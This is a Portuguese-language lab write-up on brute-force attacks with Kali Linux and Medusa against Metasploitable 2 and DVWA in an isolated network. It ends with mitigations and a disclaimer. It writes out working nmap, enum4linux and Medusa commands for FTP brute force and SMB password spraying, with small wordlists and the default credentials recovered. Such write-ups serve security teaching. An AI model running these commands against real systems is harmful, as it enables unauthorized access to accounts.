# 🔐 Laboratório de Ataques de Força Bruta com Kali Linux e Medusa

## 📌 Descrição

Este projeto demonstra a implementação de ataques de força bruta em um ambiente controlado utilizando **Kali Linux** como máquina atacante e **Metasploitable 2** como alvo vulnerável.

Os testes incluem:

* Brute force em FTP
* Ataque em login web (DVWA)
* Password spraying em SMB

---

## 🎯 Objetivos

* Compreender ataques de força bruta
* Utilizar ferramentas de pentest
* Identificar vulnerabilidades comuns
* Propor medidas de mitigação

---

## 🖥️ Ambiente Utilizado

* Máquina atacante: Kali Linux
* Máquina alvo: Metasploitable 2
* Aplicação web: DVWA
* Ferramenta: Medusa
* Virtualização: VirtualBox

---

## 🌐 Configuração de Rede

As máquinas foram configuradas em rede **Host-Only**.

Exemplo de IPs utilizados:

* Kali Linux: `192.168.56.101`
* Metasploitable 2: `192.168.56.102`

---

## 🔍 Enumeração de Serviços

Foi utilizada a ferramenta Nmap para identificar serviços ativos:

```bash
nmap -sV 192.168.56.102
```

### Serviços encontrados:

* FTP (porta 21)
* HTTP (porta 80)
* SMB (porta 445)

---

## 🚨 Ataque 1: Brute Force em FTP

### Objetivo

Descobrir credenciais válidas no serviço FTP.

### Comando utilizado:

```bash
medusa -h 192.168.56.102 -u msfadmin -P wordlists/passwords.txt -M ftp
```

### Resultado

Credenciais encontradas:

* Usuário: `msfadmin`
* Senha: `msfadmin`

### Validação

```bash
ftp 192.168.56.102
```

Login realizado com sucesso.

---

## 🌐 Ataque 2: Brute Force no DVWA

### Acesso

```
http://192.168.56.102/dvwa
```

### Credenciais padrão:

* Usuário: `admin`
* Senha: `password`

### Descrição

Foi realizada tentativa de automação de login utilizando lista de senhas.

Esse tipo de ataque explora formulários web que não possuem:

* Limite de tentativas
* CAPTCHA
* Proteção contra bots

---

## 💣 Ataque 3: Password Spraying em SMB

### Enumeração de usuários

```bash
enum4linux 192.168.56.102
```

### Ataque com Medusa

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt
```

### Resultado

Identificação de credenciais válidas utilizando combinações simples de senha.

---

## 📁 Wordlists utilizadas

### passwords.txt

```
123456
password
admin
msfadmin
1234
qwerty
```

### users.txt

```
root
admin
user
msfadmin
guest
```

---

## 🛡️ Medidas de Mitigação

* Implementação de limite de tentativas de login
* Uso de autenticação multifator (MFA)
* Monitoramento de logs
* Bloqueio de IP após múltiplas falhas
* Uso de senhas fortes e políticas de senha
* Implementação de CAPTCHA em formulários web


## 📚 Conclusão

O laboratório demonstrou que sistemas com configurações fracas são altamente vulneráveis a ataques de força bruta.

Mesmo utilizando listas simples de senhas, foi possível obter acesso a serviços críticos, reforçando a importância da adoção de boas práticas de segurança.

---

## ⚠️ Aviso

Este projeto foi realizado exclusivamente para fins educacionais em ambiente controlado.
